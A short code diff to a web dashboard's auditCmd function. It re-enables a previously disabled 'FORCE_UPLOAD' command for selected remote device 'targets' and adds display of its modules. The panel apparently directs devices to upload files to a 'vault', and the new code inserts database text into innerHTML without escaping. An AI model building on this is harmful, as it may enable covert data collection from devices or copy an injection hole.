@@ -546,10 +546,10 @@
 
         async function auditCmd(type) {
             if (selectedDeviceIds.size === 0) return toast("SELECT TARGETS TO AUDIT", "danger");
-            if (type === 'FORCE_UPLOAD') return; // Command logic removed: See nothing
             
             document.getElementById('status-title').innerText = `CLUSTER AUDIT: ${type}`;
             document.getElementById('status-content').innerHTML = '<div style="padding:20px; text-align:center;">FETCHING CLUSTER DATA...</div>';
+            document.getElementById('status-overlay').style.display = 'flex';
             document.getElementById('status-overlay').style.display = 'flex';
 
             const { data: commands, error } = await sb.from('file_commands')
@@ -575,6 +575,13 @@
                         <div style="font-size:0.75rem; color:#aaa; margin:5px 0;">${c.result_file_path ? c.result_file_path.split('/').pop() : 'Processing...'}</div>
                         <div onclick="switchTab('files')" style="color:var(--primary); cursor:pointer; font-size:0.7rem; text-decoration:underline;">OPEN IN VAULT</div>
                     </div>`;
+                }
+
+                if (type === 'FORCE_UPLOAD') {
+                    const modules = c.content.split(',').map(m => m.trim());
+                    dataHtml = `<div style="margin-top:10px; display:flex; flex-wrap:wrap; gap:5px;">` + 
+                        modules.map(m => `<span style="font-size:0.6rem; padding:2px 6px; background:rgba(0,255,157,0.1); color:var(--success); border:1px solid rgba(0,255,157,0.2); text-transform:uppercase;">${m}</span>`).join('') + 
+                        `</div>`;
                 }
 
                 return `
